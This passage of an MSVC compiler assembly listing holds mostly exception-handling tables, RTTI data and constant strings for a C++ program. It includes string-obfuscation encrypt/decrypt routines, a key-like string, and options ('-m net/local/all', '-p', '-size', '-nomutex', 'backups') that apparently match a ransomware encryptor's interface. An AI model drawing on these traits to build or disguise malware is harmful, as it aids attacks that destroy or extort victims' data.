	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+416
	DD	imagerel $unwind$??0?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0ED@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+752
	DD	imagerel $unwind$??0?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+1172
	DD	imagerel $unwind$??0?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+72
	DD	imagerel $unwind$??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN5
	DD	imagerel $LN5+455
	DD	imagerel $unwind$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Convert_size@_K_K@std@@YA_K_K@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$_Convert_size@_K_K@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z DD imagerel $LN3
	DD	imagerel $LN3+124
	DD	imagerel $unwind$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD imagerel $LN6
	DD	imagerel $LN6+390
	DD	imagerel $unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$max@_K@std@@YAAEB_KAEB_K0@Z DD imagerel $LN5
	DD	imagerel $LN5+119
	DD	imagerel $unwind$??$max@_K@std@@YAAEB_KAEB_K0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DD imagerel $LN4
	DD	imagerel $LN4+97
	DD	imagerel $unwind$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD imagerel $LN3
	DD	imagerel $LN3+119
	DD	imagerel $unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+98
	DD	imagerel $unwind$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$min@_K@std@@YAAEB_KAEB_K0@Z DD imagerel $LN5
	DD	imagerel $LN5+119
	DD	imagerel $unwind$??$min@_K@std@@YAAEB_KAEB_K0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD imagerel $LN5
	DD	imagerel $LN5+94
	DD	imagerel $unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD imagerel $LN4
	DD	imagerel $LN4+93
	DD	imagerel $unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD imagerel $LN12
	DD	imagerel $LN12+154
	DD	imagerel $unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
pdata	ENDS
CRT$XCU	SEGMENT
?g_Path$initializer$@@3P6AXXZEA DQ FLAT:??__Eg_Path@@YAXXZ ; g_Path$initializer$
CRT$XCU	ENDS
;	COMDAT rtc$TMZ
rtc$TMZ	SEGMENT
_RTC_Shutdown.rtc$TMZ DQ FLAT:_RTC_Shutdown
rtc$TMZ	ENDS
;	COMDAT rtc$IMZ
rtc$IMZ	SEGMENT
_RTC_InitBase.rtc$IMZ DQ FLAT:_RTC_InitBase
rtc$IMZ	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_array_new_length@std@@8 DD imagerel ??_R0?AVbad_array_new_length@std@@@8 ; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R2bad_array_new_length@std@@8 DD imagerel ??_R1A@?0A@EA@bad_array_new_length@std@@8 ; std::bad_array_new_length::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@bad_alloc@std@@8
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R3bad_array_new_length@std@@8 DD 00H			; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	03H
	DD	imagerel ??_R2bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_array_new_length@std@@6B@
rdata$r	SEGMENT
??_R4bad_array_new_length@std@@6B@ DD 01H		; std::bad_array_new_length::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	imagerel ??_R3bad_array_new_length@std@@8
	DD	imagerel ??_R4bad_array_new_length@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_alloc@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_alloc@std@@8 DD imagerel ??_R0?AVbad_alloc@std@@@8 ; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_alloc@std@@8
rdata$r	SEGMENT
??_R2bad_alloc@std@@8 DD imagerel ??_R1A@?0A@EA@bad_alloc@std@@8 ; std::bad_alloc::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3bad_alloc@std@@8
rdata$r	SEGMENT
??_R3bad_alloc@std@@8 DD 00H				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	imagerel ??_R2bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_alloc@std@@6B@
rdata$r	SEGMENT
??_R4bad_alloc@std@@6B@ DD 01H				; std::bad_alloc::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	imagerel ??_R3bad_alloc@std@@8
	DD	imagerel ??_R4bad_alloc@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@exception@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@exception@std@@8 DD imagerel ??_R0?AVexception@std@@@8 ; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R2exception@std@@8
rdata$r	SEGMENT
??_R2exception@std@@8 DD imagerel ??_R1A@?0A@EA@exception@std@@8 ; std::exception::`RTTI Base Class Array'
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3exception@std@@8
rdata$r	SEGMENT
??_R3exception@std@@8 DD 00H				; std::exception::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	imagerel ??_R2exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R4exception@std@@6B@
rdata$r	SEGMENT
??_R4exception@std@@6B@ DD 01H				; std::exception::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	imagerel ??_R3exception@std@@8
	DD	imagerel ??_R4exception@std@@6B@
rdata$r	ENDS
;	COMDAT ??_C@_0BK@DGNDOENM@hsfjuukjzloqu28oajh727190@
CONST	SEGMENT
??_C@_0BK@DGNDOENM@hsfjuukjzloqu28oajh727190@ DB 'hsfjuukjzloqu28oajh7271'
	DB	'90', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@FMKEKOCJ@?$AAb?$AAa?$AAc?$AAk?$AAu?$AAp?$AAs@
CONST	SEGMENT
??_C@_1BA@FMKEKOCJ@?$AAb?$AAa?$AAc?$AAk?$AAu?$AAp?$AAs@ DB 'b', 00H, 'a', 00H
	DB	'c', 00H, 'k', 00H, 'u', 00H, 'p', 00H, 's', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_17ODNIDLDN@?$AAn?$AAe?$AAt@
CONST	SEGMENT
??_C@_17ODNIDLDN@?$AAn?$AAe?$AAt@ DB 'n', 00H, 'e', 00H, 't', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@GFKCHEPI@?$AAl?$AAo?$AAc?$AAa?$AAl@
CONST	SEGMENT
??_C@_1M@GFKCHEPI@?$AAl?$AAo?$AAc?$AAa?$AAl@ DB 'l', 00H, 'o', 00H, 'c', 00H
	DB	'a', 00H, 'l', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_17IIFKAHCJ@?$AAa?$AAl?$AAl@
CONST	SEGMENT
??_C@_17IIFKAHCJ@?$AAa?$AAl?$AAl@ DB 'a', 00H, 'l', 00H, 'l', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1BC@INLGKNFA@?$AA?9?$AAn?$AAo?$AAm?$AAu?$AAt?$AAe?$AAx@
CONST	SEGMENT
??_C@_1BC@INLGKNFA@?$AA?9?$AAn?$AAo?$AAm?$AAu?$AAt?$AAe?$AAx@ DB '-', 00H
	DB	'n', 00H, 'o', 00H, 'm', 00H, 'u', 00H, 't', 00H, 'e', 00H, 'x'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@HGCPEPBL@?$AA?9?$AAs?$AAi?$AAz?$AAe@
CONST	SEGMENT
??_C@_1M@HGCPEPBL@?$AA?9?$AAs?$AAi?$AAz?$AAe@ DB '-', 00H, 's', 00H, 'i', 00H
	DB	'z', 00H, 'e', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19HOMBNICI@?$AA?9?$AAl?$AAo?$AAg@
CONST	SEGMENT
??_C@_19HOMBNICI@?$AA?9?$AAl?$AAo?$AAg@ DB '-', 00H, 'l', 00H, 'o', 00H, 'g'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_15DMEDGHGK@?$AA?9?$AAm@
CONST	SEGMENT
??_C@_15DMEDGHGK@?$AA?9?$AAm@ DB '-', 00H, 'm', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_15JODAOICI@?$AA?9?$AAp@
CONST	SEGMENT
??_C@_15JODAOICI@?$AA?9?$AAp@ DB '-', 00H, 'p', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@JFNIOLAK@string?5too?5long@
CONST	SEGMENT
??_C@_0BA@JFNIOLAK@string?5too?5long@ DB 'string too long', 00H ; `string'
CONST	ENDS
;	COMDAT _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24 DD 010H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_alloc@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_alloc@std@@@8
data$r	SEGMENT
??_R0?AVbad_alloc@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::bad_alloc `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_alloc@std@@', 00H
data$r	ENDS
;	COMDAT _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_array_new_length@std@@@8
data$r	SEGMENT
??_R0?AVbad_array_new_length@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::bad_array_new_length `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_array_new_length@std@@', 00H
data$r	ENDS
;	COMDAT _CTA3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_CTA3?AVbad_array_new_length@std@@ DD 03H
	DD	imagerel _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	ENDS
;	COMDAT _TI3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_TI3?AVbad_array_new_length@std@@ DD 00H
	DD	imagerel ??1bad_array_new_length@std@@UEAA@XZ
	DD	00H
	DD	imagerel _CTA3?AVbad_array_new_length@std@@
xdata$x	ENDS
;	COMDAT _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0exception@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVexception@std@@@8
data$r	SEGMENT
??_R0?AVexception@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::exception `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVexception@std@@', 00H
data$r	ENDS
;	COMDAT ??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
CONST	SEGMENT
??_C@_0BF@KINCDENJ@bad?5array?5new?5length@ DB 'bad array new length', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7bad_array_new_length@std@@6B@
CONST	SEGMENT
??_7bad_array_new_length@std@@6B@ DQ FLAT:??_R4bad_array_new_length@std@@6B@ ; std::bad_array_new_length::`vftable'
	DQ	FLAT:??_Ebad_array_new_length@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_7bad_alloc@std@@6B@
CONST	SEGMENT
??_7bad_alloc@std@@6B@ DQ FLAT:??_R4bad_alloc@std@@6B@	; std::bad_alloc::`vftable'
	DQ	FLAT:??_Ebad_alloc@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_C@_0BC@EOODALEL@Unknown?5exception@
CONST	SEGMENT
??_C@_0BC@EOODALEL@Unknown?5exception@ DB 'Unknown exception', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7exception@std@@6B@
CONST	SEGMENT
??_7exception@std@@6B@ DQ FLAT:??_R4exception@std@@6B@	; std::exception::`vftable'
	DQ	FLAT:??_Eexception@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	070070029H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD 025051301H
	DD	010e2313H
	DD	070070025H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$min@_K@std@@YAAEB_KAEB_K0@Z DD 025051801H
	DD	01132318H
